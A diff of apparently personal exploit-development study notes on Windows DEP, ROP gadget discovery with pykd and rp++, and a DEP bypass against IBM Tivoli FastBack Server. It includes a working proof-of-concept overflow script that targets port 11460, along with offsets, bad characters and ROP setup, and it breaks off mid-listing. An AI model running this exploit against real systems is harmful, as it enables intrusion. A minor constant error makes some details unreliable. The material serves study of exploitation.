@@ -711,9 +711,7 @@ x/s 0x402000
 
 # Exploiting Stack Overflows
 
-Data Execution Prevention (DEP):
-- perform additional memory checks to help prevent malicious code from running on a system.
-- helps prevent code execution from data pages by raising an exception when attempts are made to do so.
+Data Execution Prevention (DEP) helps prevent code execution from data pages by raising an exception when attempts are made to do so.
 
 Address Space Layout Randomization (ASLR) randomizes the base addresses of loaded applications and DLLs every time the OS is booted.
 
@@ -9162,2720 +9160,7681 @@ Either use the `PE.Explorer_setup.exe` installer present in `C:\Installers\UPX` 
 
 # Stack Overflows and DEP Bypass
 
-```nasm
+Microsoft introduced DEP in Windows XP Service Pack 2 and Windows Server 2003 Service Pack 1 to prevent code execution from a non-executable memory region (e.g. the stack)
 
-```
+On compatible CPUs, DEP sets the non-executable (`NX`) bit that distinguishes between code and data areas in memory.
 
+At a global level, the OS can be configured through the `/NoExecute` option in `boot.ini` (Windows XP) or through `bcdedit.exe`, (from Windows Vista and above) to run in one of 4 modes:
 
-```nasm
+-	`OptIn`: DEP is enabled for system processes and custom-defined applications only.
+-	`OptOut`: DEP is enabled for everything except specifically exempt applications.
+-	`AlwaysOn`: DEP is permanently enabled.
+-	`AlwaysOff`: DEP is permanently disabled.
 
-```
+DEP can be enabled or disabled on a **per-process basis at execution time**.
 
+`LdrpCheckNXCompatibility`, resides in `ntdll.dll`, performs various checks to determine whether or not `NX` support should be enabled for the process.
 
+> A call to `NtSetInformationProcess` (within `ntdll.dll`) is issued to **enable or disable DEP** for the running process.
 
-```nasm
+Default setting:
 
-```
+- Windows client OS like Windows 7 and Windows 10, have `OptIn`
+
+- Windows server editions like Windows Server 2012 or Windows Server 2019 have `AlwaysOn`.
 
+Open Notepad and attach WinDbg to it > display the memory protections of a given address.
 
-```nasm
+`!vprot eip`
 
 ```
+BaseAddress:       77901000
+AllocationBase:    77870000
+AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
+RegionSize:        00087000
+State:             00001000  MEM_COMMIT
+Protect:           00000020  PAGE_EXECUTE_READ
+Type:              01000000  MEM_IMAGE
+```
 
+`PAGE_EXECUTE_READ` => it is both executable and readable.
 
-```nasm
+`!vprot esp`
 
+```
+BaseAddress:       0101f000
+AllocationBase:    00fe0000
+AllocationProtect: 00000004  PAGE_READWRITE
+RegionSize:        00001000
+State:             00001000  MEM_COMMIT
+Protect:           00000004  PAGE_READWRITE
+Type:              00020000  MEM_PRIVATE
 ```
 
+The memory address is only writable and readable.
 
-```nasm
+These memory protections must be enforced by the CPU through DEP to have any effect.
 
-```
+To check if DEP is enabled, we can use the Narly WinDbg extension and  dump enabled mitigations.
 
+`.load narly`
 
-```nasm
+`!nmod`
 
 ```
-
-```nasm
-
+01030000 0106f000 notepad  /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\notepad.exe
+...
 ```
-
 
-```nasm
-
-```
+Narly detects the security features by parsing the `PE header`.
 
+The SafeSEH, ASLR, and DEP memory protections are enabled.
 
-```nasm
+Verify DEP by writing a dummy shellcode of 4 `NOPs` on the stack and then copying the current stack address into EIP and single step over the first NOP:
 
-```
+`ed esp 90909090`
 
+`r eip = esp`
 
-```nasm
+`r`
 
 ```
-
+0101f7c8 90              nop
+```
 
-```nasm
+`p`
 
 ```
-
+(1d60.120c): Access violation - code c0000005 (first chance)
+0101f7c8 90              nop
+```
 
+The execution is blocked and the OS throws an access violation.
 
-```nasm
+## Windows Defender Exploit Guard
 
-```
+Windows Defender Exploit Guard allow us to enforce DEP for the Tivoli FastBack server.
 
+Use Narly to determine if DEP is enabled:
 
-```nasm
+`!nmod`
 
 ```
+...
+00400000 00c0c000 FastBackServer       /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\FastBackServer.exe
+...
+```
 
+DEP is not enabled.
 
-```nasm
+To enable DEP, either modify the OS settings and set DEP to `AlwaysOn`, or use another security feature.
 
-```
+`Enhanced Mitigation Experience Toolkit (EMET)` software package allows an administrator to enforce different mitigations even if the application was compiled without them.
 
+With EMET, it is possible to enable DEP for the FastBack server process without affecting other parts of the OS.
 
-```nasm
+Microsoft deprecated EMET with the release of the `Windows 10 Fall Creators Update`.
 
-```
+From that version of Windows 10 and forward, EMET was renamed to `Windows Defender Exploit Guard (WDEG)`.
 
+EMET and WDEG also provide additional mitigations. (out of scope)
 
-```nasm
+Use WDEG to enable DEP for the FastBack server:
 
-```
+1. Open `Windows Defender Security Center` > open `App & browser control`, scroll to the bottom > click on `Exploit protection` settings. This opens the main WDEG window.
+ 
+2. Choose the `Program settings` tab, click `Add program to customize`, and select `Choose exact file path`
 
+3. Navigate to `C:\Program Files\Tivoli\TSM\FastBack\server` and select `FastBackServer.exe` > scroll down to `Data Execution Prevention (DEP)` and enable it by ticking the `Override system settings` box.
+ 
+4. Restart the FastBackServer service to have the changes take effect.
 
-```nasm
+Narly would still not report that DEP is enabled because Narly only presents information parsed from the executable.
 
-```
+Test the presence of DEP again:
+
+`ed esp 90909090`
 
+`r eip = esp`
 
-```nasm
+`p`
 
 ```
+(7a8.1310): Access violation - code c0000005 (first chance)
+0b93ff54 90              nop
+```
 
+## Return Oriented Programming
 
-```nasm
+The 1st techniques to bypass DEP were developed on Linux and called return-to-libc (`ret2libc`).
 
-```
+Once Windows introduced DEP, the Return Oriented Programming (`ROP`) method was developed.
 
+Exploit developers first abused the fact that **DEP can be disabled on a per-process basis**:
 
-```nasm
+- Invoke the `NtSetInformationProcess` API
+- Replace the `JMP ESP` assembly instruction with the memory address of `NtSetInformationProcess`.
+- Place the required arguments on the stack as part of the overwrite.
+- Once the `NtSetInformationProcess` API finishes, jump to our shellcode again.
 
-```
+To mitigate the bypass through `NtSetInformationProcess`, Microsoft implemented `Permanent DEP`:
 
+- From Vista SP1 and XP SP3 onward, any executable linked with the `/NXCOMPAT` flag during compilation is automatically set as `OptIn`.
 
+- This ensures that DEP can't be disabled for the entire runtime duration of the process.
 
-```nasm
+- This method has the same effect as the `AlwaysOn` system policy, but on a per-process basis.
 
-```
+Other attack variations:
 
+- Uses the `WinExec` function to execute commands on the vulnerable system (not as effective as having arbitrary shellcode execution).
 
-```nasm
+- Directly calling the new `SetProcessDEPPolicy` API (from the application itself yields the same results).
 
-```
+=> The only option is to circumvent the OS `NX` checks.
 
+`ROP` technique:
 
-```nasm
+- Allows a `ret2libc` attack to be mounted on x86/x64 executables without calling any functions.
 
-```
+- Instead of returning to the beginning of a function and simulating a call, we can return to any instruction sequence in the executable memory pages that **ends with a `return`**.
 
+- ASLR can impact and limit this technique.
 
-```nasm
+By combining a large number of short instruction sequences, we can build gadgets that allow arbitrary computation and perform higher-level actions, such as writing content to a memory location.
 
-```
+Because of the **variable length** of assembly instructions on the x86 architecture, returning into the middle of existing opcodes can lead to different instructions:
 
-```nasm
+`u 004c10ee L2`
 
 ```
-
-```nasm
-
+FastBackServer!std::_Allocate+0x1e:
+004c10ee 5d              pop     ebp
+004c10ef c3              ret
 ```
-
 
-```nasm
+`u 004c10ee - 1 L2`
 
 ```
+FastBackServer!std::_Allocate+0x1d:
+004c10ed 045d            add     al,5Dh
+004c10ef c3              ret
+```
 
+This is not true for all architectures. E.g., the **ARM** architecture has **fixed-length instructions**.
 
-```nasm
+The number of obtainable gadgets depends on the Windows version and the vulnerable application:
 
-```
+2 different approaches we could take:
 
+1.	Build a 100% ROP shellcode. (complicated)
 
-```nasm
+2.	Build a ROP stage that can lead to subsequent execution of traditional shellcode.
 
-```
+A goal of the ROP stage could be to allocate a chunk of memory with write and execute permissions and then copy shellcode to it.
 
+One way to implement this ROP attack is to allocate memory using the Win32 `VirtualAlloc` API.
 
-```nasm
+A different approach to bypass DEP could be to change the permissions of the memory page where the shellcode already resides by calling the Win32 `VirtualProtect` API.
 
-```
+The address of `VirtualProtect` or `VirtualAlloc` is usually retrieved from the Import Address Table (`IAT`) of the target DLL. Then the **required API parameters** can be set on the **stack** before the relevant APIs are invoked.
 
+Often, it's not possible to predict argument values before triggering the exploit => use ROP itself to solve this problem as well.
 
+In the buffer that triggers the vulnerability, create a skeleton of the function call and then use ROP gadgets to dynamically set the parameters on the stack.
 
-```nasm
+As another alternative to bypass DEP, use the Win32 `WriteProcessMemory` API. The idea is to hot-patch the code section (the `.text` section) of a running process, inject shellcode, and then eventually jump into it.
 
-```
+`WriteProcessMemory` is able to patch executable memory through a call to `NtProtectVirtualMemory`.
 
+## Gadget Selection
 
-```nasm
+To locate the gadgets that are needed to invoke the APIs.
 
-```
+We leveraged the WinDbg `search` command to obtain the address of an instruction like `JMP ESP`.
 
+Locate the addresses of all the possible gadgets we can obtain.
 
-```nasm
+2 different methods:
 
-```
+1. Requires the use of Python along with the `Pykd` WinDbg extension.
 
+2. Another pre-built tool called `RP++`.
 
-```nasm
+We will omit discussing `Mona` because it does not support Python3 or 64-bit.
 
-```
+### Debugger Automation: Pykd
 
+Pykd is a Python-based WinDbg extension with numerous APIs to help automate debugging and crash dump analysis.
 
-```nasm
+Pykd modules can either be used as standalone scripts or loaded as a WinDbg extension.
 
-```
+Using `pykd` will allow us to automate the gadget search.
 
-```nasm
+Use the `dprintln` method to print a string to the console.
 
+```python
+from pykd import *
+dprintln("Hello World!")
 ```
-
 
-```nasm
+To run this pykd script, 1st attach WinDbg to the `FastBackServer` process and load `pykd` through the `.load` command.
 
-```
+Then use the `!py` extension command to use Python and supply the name and path of the script as an argument.
 
+`.load pykd`
 
-```nasm
+`!py C:\Tools\pykd\HelloWorld.py`
 
+```
+Hello World!
 ```
 
+If the script has a standard ".py" extension, the extension can be omitted when running it in WinDbg.
 
-```nasm
+Building our ROP finder script.
 
-```
+The pykd script must locate gadgets inside code pages of an `EXE` or `DLL` with the **execute permission set**.
 
+1. Accept the name of the module as a parameter and locate it in memory.
 
-```nasm
+2. For the selected module, locate all **memory pages** that are executable.
 
-```
+3. For each of these memory pages, locate the memory address of all the `RET` assembly instructions and store them in a list.
 
+4. Pick the first one, subtract 1 byte from it, and disassemble the opcodes to check if they are valid assembly instructions. If they are, we have found a possible ROP gadget.
 
+5. This process will continue, by subtracting another byte and rechecking. The maximum number of bytes to subtract depends on the **length of ROP gadgets** we want.
 
-```nasm
+Typically, it is not beneficial to search for very long ROP gadgets because they will eventually contain instructions that are not useful, such as calls and jumps.
 
-```
+Obtain a reference to the module where we want to locate gadgets.
+
+Use the pykd `module` class to create a Python object that represents a loaded `DLL` or `EXE`:
 
+```python
+from pykd import *
 
-```nasm
+if __name__ == '__main__':
+ count = 0
+ try:
+     modname = sys.argv[1].strip()
+ except IndexError:
+     print("Syntax: findrop.py modulename")
+     sys.exit()
 
+ mod = module(modname)
 ```
 
+Find the number of memory pages inside of it.
 
-```nasm
+On the x86 architecture, every memory page is `0x1000` bytes, and the `module` object contains the properties `begin` and `end`, which returns the start and end address of the allocated memory for the module.
 
-```
+```python
+from pykd import *
 
+PAGE_SIZE = 0x1000
 
-```nasm
+if __name__ == '__main__':
+ count = 0
+ try:
+     modname = sys.argv[1].strip()
+ except IndexError:
+     print("Syntax: findrop.py modulename")
+     sys.exit()
 
-```
+ mod = module(modname)
 
+ if mod:
+    pn = int((mod.end() - mod.begin()) / PAGE_SIZE)
+    print("Total Memory Pages: %d" % pn)
+```
 
-```nasm
+`!py C:\Tools\pykd\findrop`
 
+```
+Syntax: findrop.py modulename
 ```
 
-```nasm
+`!py C:\Tools\pykd\findrop FastBackServer`
 
 ```
+Total Memory Pages: 2060
+```
 
+Although we have found a large number of memory pages, many of them will not be executable.
 
-```nasm
+Parse each of them and locate the ones that are **executable**.
 
-```
+The pykd `getVaProtect` method will return the memory protection constant enum value for a given address.
 
+ 4 constant enum value that represent executable pages are:
 
-```nasm
+1. `PAGE_EXECUTE` (`0x10`)
 
-```
+2. `PAGE_EXECUTE_READ` (`0x20`)
 
+3. `PAGE_EXECUTE_READWRITE` (`0x20`)
 
-```nasm
+4. `PAGE_EXECUTE_WRITECOPY` (`0x80`)
 
-```
 
+Loop over each memory page, invoke `getVaProtect` on the 1st address of the page, and check if the result is equal to one of the 4 values above.
 
-```nasm
+```python
+from pykd import *
 
-```
+PAGE_SIZE = 0x1000
+
+MEM_ACCESS_EXE = {
+0x10  : "PAGE_EXECUTE"                                                     ,
+0x20  : "PAGE_EXECUTE_READ"                                                ,
+0x40  : "PAGE_EXECUTE_READWRITE"                                           ,
+0x80  : "PAGE_EXECUTE_WRITECOPY"                                           ,
+}
 
+def isPageExec(address):
+ try:
+     protect = getVaProtect(address)
+ except:
+     protect = 0x1
+ if protect in MEM_ACCESS_EXE.keys():
+     return True
+ else:
+     return False
 
+if __name__ == '__main__':
+ count = 0
+ try:
+     modname = sys.argv[1].strip()
+ except IndexError:
+     print("Syntax: findrop.py modulename")
+     sys.exit()
 
-```nasm
+ mod = module(modname)
+ pages = []
 
+ if mod:
+    pn = int((mod.end() - mod.begin()) / PAGE_SIZE)
+    print("Total Memory Pages: %d" % pn)
+    
+    for i in range(0, pn):
+     page = mod.begin() + i*PAGE_SIZE
+     if isPageExec(page):
+         pages.append(page)
+    print("Executable Memory Pages: %d" % len(pages))
 ```
 
+Executing the script will print the number of executable pages while storing the address of each of them in an array.
 
-```nasm
+`!py C:\Tools\pykd\findrop FastBackServer`
 
 ```
-
+Total Memory Pages: 2060
+Executable Memory Pages: 637
+```
 
-```nasm
+Search each of them for `return` instructions.
 
-```
+Overall goal is to search backward from all of the `return` instructions to detect possible gadgets.
 
+2 types of `return` instructions.
 
-```nasm
+1. Regular `RET` instruction, which pops the address at the top of the stack into EIP and increases ESP by 4.
 
-```
+2. `RET 0xXX`, where the address at the top of the stack is popped into EIP, and ESP is increased by `0xXX` bytes.
 
+The normal return instruction has the opcode value `0xC3`, whereas the return with an offset has an opcode of `0xC2`, followed by the number of bytes in the offset.
 
-```nasm
+=> If we search all bytes on a page to check if they are `0xC3` or `0xC2`, we will find all return instructions.
 
-```
+Iterates over each byte for every executable page and tests for the return opcodes.
 
-```nasm
+Set up an empty array `retn` to hold all the return instruction addresses.
 
+```python
+def findRetn(pages):
+ retn = []
+ for page in pages:
+     ptr = page
+     while ptr < (page + PAGE_SIZE):
+         b = loadSignBytes(ptr, 1)[0] & 0xff
+         if b not in [0xc3, 0xc2]:
+             ptr += 1
+             continue
+         else:
+             retn.append(ptr)
+             ptr += 1
+             
+ print("Found %d ret instructions" % len(retn))
+ return retn
 ```
 
+Iterate over all the executable pages we located.
 
-```nasm
+For each of these entries, perform a while loop that will go through each byte in the given page, pointed by the `ptr` variable.
 
-```
+The pykd `loadSignBytes` API is used to read the byte at the given memory address, pointed to by `ptr`.
 
+The API returns signed bytes and through a bitwise AND operation ("&") we obtain the unsigned value.
 
-```nasm
+The byte is then compared to the 2 return instruction opcode values.
 
-```
+If a return instruction is found, the address is added to the retn array.
 
+At the end of the function, the number of return instructions found is printed, and the populated array is returned.
 
-```nasm
+`!py C:\Tools\pykd\findrop FastBackServer`
 
+```
+Total Memory Pages: 2060
+Executable Memory Pages: 637
+Found 13155 ret instructions
 ```
 
+Discover all the available gadgets by:
 
-```nasm
+- Iterate over each return instruction and subtract 1 byte, then attempt to disassemble the resulting instructions.
 
-```
+- Subtract 2 bytes and disassemble the resulting instructions.
 
+- Repeat this process until we reach the maximum gadget size we want.
 
+Since not all binary values correspond to valid opcodes, we will encounter many invalid instructions, and our code needs to detect and handle this scenario.
 
-```nasm
+If a gadget contains an instruction that will alter the execution flow, such as a `jump` or a `call`, we must **filter** them out as well.
 
-```
+Assembly language contains several privileged instructions, which a regular application cannot execute. => remove these also.
 
+Use the `disasm` class to disassemble a CPU instruction at any given memory address. Then, invoke the `instruction` method on the instantiated `disasm` object to obtain the given instruction.
 
-```nasm
+Find and print a single instruction by subtracting one byte from the first return instruction.
 
+```python
+def getGadgets(addr):
+  ptr = addr - 1
+  dasm = disasm(ptr)
+  gadget_size = dasm.length()
+  print("Gadget size is: %x" % gadget_size)
+  instr = dasm.instruction()
+  print("Found instruction: %s" % instr)
 ```
 
+The address of the return instruction passed to `getGadgets` is decremented by 1 byte and assigned to `ptr`.
 
-```nasm
+With the object created, call the `length` method to get the size of the current gadget and print it.
 
+`!py C:\Tools\pykd\findrop FastBackServer`
+
+```
+Total Memory Pages: 2060
+Executable Memory Pages: 637
+Found 13155 ret instructions
+Gadget size is: 1
+Found instruction: 00401015 5d              pop     ebp
 ```
 
+We have located the hexadecimal value of `0x5D`, just before the return instruction.
 
-```nasm
+The output states that this value equates to the instruction `POP EBP`.
 
-```
+The address `0x401015` will give us access to the gadget "POP EBP; RETN". We can use it since it contains valid instructions, none of which are privileged.
+
+Scale up this process with multiple tasks, the first of which is to subtract more than one byte.
 
+In our script, we are going to set the default gadget length value to `8`, but also allow the user to input a custom value.
 
-```nasm
+Second, we must create a list of privileged instructions along with the WinDbg interpretation of an invalid instruction, which is given as "???".
 
+List of privileged instructions along with the representation of an invalid instruction (Avoid any gadgets with any of these instructions as they would cause an access violation while executing.)
+
+```python
+BAD = ["clts", "hlt", "lmsw", "ltr", "lgdt", "lidt" ,"lldt", "mov cr", "mov dr",
+    "mov tr", "in ", "ins", "invlpg", "invd", "out", "outs", "cli", "sti"
+    "popf", "pushf", "int", "iret", "iretd", "swapgs", "wbinvd", "???"]
 ```
 
-```nasm
+List of bad assembly instructions to contain any execution flow instructions, like a call or a jump.
 
+```python
+BAD = ["clts", "hlt", "lmsw", "ltr", "lgdt", "lidt" ,"lldt", "mov cr", "mov dr",
+    "mov tr", "in ", "ins", "invlpg", "invd", "out", "outs", "cli", "sti"
+    "popf", "pushf", "int", "iret", "iretd", "swapgs", "wbinvd", "call",
+    "jmp", "leave", "ja", "jb", "jc", "je", "jr", "jg", "jl", "jn", "jo",
+    "jp", "js", "jz", "lock", "enter", "wait", "???"]
 ```
 
+In some advanced cases, we might want to make use of a gadget containing a conditional jump instruction or a call. If we craft the stack layout appropriately, we can make use of these gadgets without disrupting the execution flow, but typically, it is best to avoid them altogether unless strictly required by specific conditions.
 
-```nasm
+Since the output of the instruction method will be presented as a readable ASCII string like "POP EBP", we can use our generated list of bad instructions together with Python's any12 method. Its usage in an if statement:
 
+```python
+if any(bad in instr for bad in BAD):
+  break
 ```
 
+The `instr` variable will contain the output of the instruction method. Here we will compare all the elements of the instr variable with all elements in the array of bad instructions called BAD. If any of them are equal, the any function will return true, triggering the break instruction and allowing us to skip to the next ptr address.
 
-```nasm
+The code also verifies that the series of instructions ends with a ret instruction, to ensure that it is indeed a usable gadget.
 
-```
+The final part involves combining all the previous steps along with some code that outputs the results to a file, which we can search through later. Since this is not a Python course, we are going to omit a detailed description of these steps. The complete script is located in C:\Tools\pykd\findropfull.py.
 
+When the script is executed, it will save the gadgets in C:\tools\pykd\findrop_output.txt, where we can use a text editor to search through it.
 
-```nasm
+First, let's execute the complete script and allow it to generate the file, as shown in Listing 22.
 
+`!py C:\Tools\pykd\findrop FastBackServer`
+
+```
+###############################################################
+# findrop.py pykd Gadget Discovery module #
+###############################################################
+[+] Total Memory Pages: 2060
+[+] Executable Memory Pages: 637
+[+] Found 13155 ret instructions
+[+] Gadget discovery started...
+[+] Gadget discovery ended (13 secs).
+[+] Found 30368 gadgets in FastBackServer.
 ```
 
+The script found more than 30000 gadgets in the executable. Many of these are identical since our code does not check for duplicates.
 
-```nasm
+If we open up the generated `findrop_output.txt` file, we find each gadget printed nicely along with its address in the first column:
 
 ```
+...
+--------------------------------------------------------------------------------------
 
+00401015 5d              pop     ebp
 
+00401016 c3              ret
 
-```nasm
+--------------------------------------------------------------------------------------
 
-```
+00401013 8be5            mov     esp,ebp
 
+00401015 5d              pop     ebp
 
-```nasm
+00401016 c3              ret
 
+--------------------------------------------------------------------------------------
+...
 ```
 
+Listing 23 - Contents of generate findrop_output.txt file
+The code developed here is by no means optimized. Even the output is not the best for searching; however, it allows us to understand the basics of how to find gadgets.
+In the next section, we are going to cover another automated solution that will provide faster processing speed and better output for searching.
 
-```nasm
+### Optimized Gadget Discovery: RP++
 
-```
+In this section, we are going to introduce a different automated tool to find ROP gadgets. This tool will greatly increase our speed, compared to other scripts.
 
+The rp++1 tool is a series of open-source applications written in C++ and provides support for both 32-bit and 64-bit CPUs. Additionally, the various compiled executables can run on Windows, Linux, and macOS and can locate gadgets in Windows PE files, Linux ELF files,2 and macOS Mach-O files.3
 
-```nasm
+Besides supporting a wide array of operating systems, rp++ does not run inside the debugger, but rather works directly on the file system. This provides a massive speed increase and is one of the reasons we prefer it.
 
-```
+While rp++ is open-source, the source code is too large to walk through here and requires a strong working knowledge of C++ programming.
+rp++ follows the same principles of locating ROP gadgets as shown in our pykd script. The 32-bit version of rp++ is located in the C:\tools\dep directory on the student VM.
 
+First, we copy the FastBackServer.exe executable to the C:\tools\dep folder, then we can invoke rp-win-x86.exe. We must first supply the file to be processed with the -f option and the maximum gadget length with the -r parameter.
 
-```nasm
+In this case, the maximum gadget length is the number of assembly instructions in the ROP gadget, not the actual number of bytes, unlike in the pykd script.
 
-```
+```bat
+cd C:\Tools\dep
+copy "C:\Program Files\Tivoli\TSM\FastBack\server\FastBackServer.exe" .
 
+rp-win-x86.exe -f FastBackServer.exe -r 5 > rop.txt
+```
+        
+We picked a maximum gadget length of `5`. Anything longer typically contains instructions that might be problematic during the execution of our ROP chain. We also redirected the output to a file, since it's written to the console by default.
 
-```nasm
+Once the execution completes, we can open the output file and inspect the syntax of the located gadgets.
 
 ```
-
+Trying to open 'FastBackServer.exe'..
+Loading PE information..
+FileFormat: PE, Arch: Ia32
+Using the Nasm syntax..
 
-```nasm
+Wait a few seconds, rp++ is looking for gadgets..
+in .text
+211283 found.
 
+A total of 211283 gadgets found.
+0x00547b94: aaa  ; adc dword [eax], eax ; add esp, 0x08 ; mov ecx, dword [ebp-0x00000328] ; mov dword [ecx+0x00000208], 0x00000C04 ; call dword [0x0067E494] ;  (1 found)
+0x00569725: aaa  ; add byte [eax], al ; add byte [ebx+0x0BC0E8C8], cl ; or eax, 0x5DE58B00 ; ret  ;  (1 found)
+0x005417b2: aaa  ; add byte [eax], al ; call dword [0x0067E494] ;  (1 found)
+0x00541b78: aaa  ; add byte [eax], al ; call dword [0x0067E494] ;  (1 found)
+0x0054e2e0: aaa  ; add dword [eax], 0x81E8558B ; retn 0x0210 ;  (1 found)
+...
 ```
 
+Each gadget is listed on a separate line. The first column is its memory address followed by a ":" and a space, after which we find the first instruction.
 
-```nasm
+Additional instructions are separated by ";".
 
-```
+This syntax makes it possible to search in the text editor or use a command-line tool like `findstr`, depending on our preference.
 
+E.g., Perform a search for ": pop eax ; ret". This ensures that the POP EAX instruction is first and nothing comes between it and the `RET` instruction.
 
-```nasm
+## Bypassing DEP
 
-```
+Return to a vulnerability in the IBM Tivoli Storage Manager FastBack Server component that we discovered through reverse engineering in a previous module and create an exploit that uses ROP to bypass DEP.
 
+This vulnerability was found by sending a network packet containing the opcode value `0x534` to TCP port `11460`. This forces the execution of a code path that calls `sscanf` with a user-controlled buffer as an argument.
 
+Setting the `File` parameter of the format string used in the `sscanf` call to a very large string causes a stack buffer overflow and, in the end, yields control of the `EIP` register.
 
-```nasm
+The proof of concept to trigger this vulnerability is shown below.
 
-```
+```python
+import socket
+import sys
+from struct import pack
 
+# psAgentCommand
+buf = bytearray([0x41]*0xC)
+buf += pack("<i", 0x534)  # opcode
+buf += pack("<i", 0x0)    # 1st memcpy: offset
+buf += pack("<i", 0x500)  # 1st memcpy: size field
+buf += pack("<i", 0x0)    # 2nd memcpy: offset
+buf += pack("<i", 0x100)  # 2nd memcpy: size field
+buf += pack("<i", 0x0)    # 3rd memcpy: offset
+buf += pack("<i", 0x100)  # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
 
-```nasm
+# psCommandBuffer
+formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (b"A"*0x200,0,0,0,0)
+buf += formatString
 
-```
+# Checksum
+buf = pack(">i", len(buf)-4) + buf
 
+def main():
+	if len(sys.argv) != 2:
+		print("Usage: %s <ip_address>\n" % (sys.argv[0]))
+		sys.exit(1)
+	
+	server = sys.argv[1]
+	port = 11460
 
-```nasm
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((server, port))
 
-```
+	s.send(buf)
+	s.close()
 
+	print("[+] Packet sent")
+	sys.exit(0)
 
-```nasm
 
+if __name__ == "__main__":
+ 	main()
 ```
 
-```nasm
+Creating a ROP chain that calls the Windows `VirtualAlloc` API.
 
-```
+### Getting The Offset
 
-```nasm
+The first thing we need to do is locate the offset of the DWORD inside our input buffer that is loaded into `EIP`, just like with any other stack buffer overflow exploit. We need to do similar work for ESP as well.
 
+We are going to use the Metasploit pattern_create and pattern_offset scripts to locate the offset. First, we generate the 0x200 byte length pattern string:
+
+```bash
+msf-pattern_create -l 0x200
 ```
 
+Update the proof of concept
 
-```nasm
+```python
+import socket
+import sys
+from struct import pack
 
-```
+# psAgentCommand
+buf = bytearray([0x41]*0xC)
+buf += pack("<i", 0x534)  # opcode
+buf += pack("<i", 0x0)    # 1st memcpy: offset
+buf += pack("<i", 0x500)  # 1st memcpy: size field
+buf += pack("<i", 0x0)    # 2nd memcpy: offset
+buf += pack("<i", 0x100)  # 2nd memcpy: size field
+buf += pack("<i", 0x0)    # 3rd memcpy: offset
+buf += pack("<i", 0x100)  # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
 
+# psCommandBuffer
+pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac...
 
-```nasm
+formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (pattern,0,0,0,0)
+buf += formatString
 
+# Checksum
+buf = pack(">i", len(buf)-4) + buf
+...
 ```
 
+Execute the updated proof of concept and observe the access violation:
 
-```nasm
-
 ```
-
+(830.b2c): Access violation - code c0000005 (first chance)
+41326a41 ??              ???
+```
 
-```nasm
+EIP contains the value `41326a41`, so we use `msf-pattern_offset` to determine the offset:
 
+```bash
+msf-pattern_offset -q 41326a41
 ```
 
+This shows us that the offset is `276`. Similarly, we can dump the first DWORD ESP points to, and use msf-pattern_offset to find the offset of 280. This means that ESP points right after the return address and we do not need additional padding space between the return address and our payload.
 
+Now, we can update the proof of concept to take the offsets into account as shown in Listing 31.
 
-```nasm
+```python
+import socket
+import sys
+from struct import pack
 
-```
+# psAgentCommand
+buf = bytearray([0x41]*0xC)
+buf += pack("<i", 0x534)  # opcode
+buf += pack("<i", 0x0)    # 1st memcpy: offset
+buf += pack("<i", 0x500)  # 1st memcpy: size field
+buf += pack("<i", 0x0)    # 2nd memcpy: offset
+buf += pack("<i", 0x100)  # 2nd memcpy: size field
+buf += pack("<i", 0x0)    # 3rd memcpy: offset
+buf += pack("<i", 0x100)  # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
 
+# psCommandBuffer
+offset = b"A" * 276
+eip = b"B" * 4
+rop = b"C" * (0x400 - 276 - 4)
 
-```nasm
+formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+eip+rop,0,0,0,0)
+buf += formatString
 
+# Checksum
+buf = pack(">i", len(buf)-4) + buf
+...
 ```
 
+In addition to detecting the offsets, we also need to check for bad characters by reusing a previously described technique. Specifically, we can put all hexadecimal values between 0x00 and 0xFF in our overflow buffer and check which ones might interfere with our exploit.
+The bytes shown in Listing 32 represent all of the bad characters we would find.
 
-```nasm
-
 ```
-
-
-```nasm
-
+0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20
 ```
 
+For an exploit that uses ROP gadgets, it's important that the addresses of the gadgets do not contain any of the bad characters.
 
-```nasm
+### Locating Gadgets
 
-```
+With our newly acquired ability to locate gadgets, let's turn our attention to determining which module to use. Up until now, we have focused on FastBackServer.exe, but since the vulnerability we found in the last module is due to unsanitized input to a sscanf call, this will prove to be a problem. Let's find out why.
+First, we will use the lm command in WinDbg to dump the base and end address of FastBackServer:
 
-```nasm
+`lm m FastBackServer`
 
 ```
-
-
-```nasm
-
+Browse full module list
+start    end        module name
+00400000 00c0c000   FastBackServer   (deferred) 
 ```
 
+We find the uppermost byte is always `0x00`.
 
-```nasm
+Since the `sscanf` API accepts a null-terminated string as the first argument, and that is the buffer that ends up overflowing the stack buffer, our ROP chain cannot contain any NULL bytes or other bad characters. This implies that the gadgets cannot come from FastBackServer.exe.
 
-```
+We need to find a different module that does not contain a null byte in the uppermost byte and one that is preferably part of the application. If we choose a module that is not part of the application, then the address of gadgets will vary depending on the patch level of the operating system.
 
+Native Windows modules often have additional protections enabled, which will require an even more advanced approach, as we shall find in a future module.
 
-```nasm
+By observing the base and end addresses of all modules bundled with FastBackServer, we find multiple options. One such module is CSFTPAV6.dll as shown in Listing 34:
 
-```
+`lm m CSFTPAV6`
 
+```
+Browse full module list
+start    end        module name
+50500000 50577000   CSFTPAV6   (deferred) 
+```
 
-```nasm
+Let's copy CSFTPAV6.dll to the C:\Tools\dep folder where we can use rp++ to generate gadgets, as shown in Listing 35.
 
+```bat
+cd C:\Tools\dep
+copy "C:\Program Files\Tivoli\TSM\FastBack\server\csftpav6.dll" .
+rp-win-x86.exe -f csftpav6.dll -r 5 > rop.txt
 ```
 
+If we open the generated file, we will notice that all the gadgets have an address starting with 0x50, proving that we avoided the upper null byte. Now we are finally able to start building the ROP chain itself.
 
+### Preparing the Battlefield
 
-```nasm
+To start building our ROP chain, let's begin by showing how to use VirtualAlloc to bypass DEP. VirtualAlloc can reserve, commit, or change the state of a region of pages in the virtual address space of the calling process.
 
+The first thing we need to know about VirtualAlloc is its function prototype. This is documented by Microsoft, as shown in Listing 36.
+
+```C
+ LPVOID WINAPI VirtualAlloc(
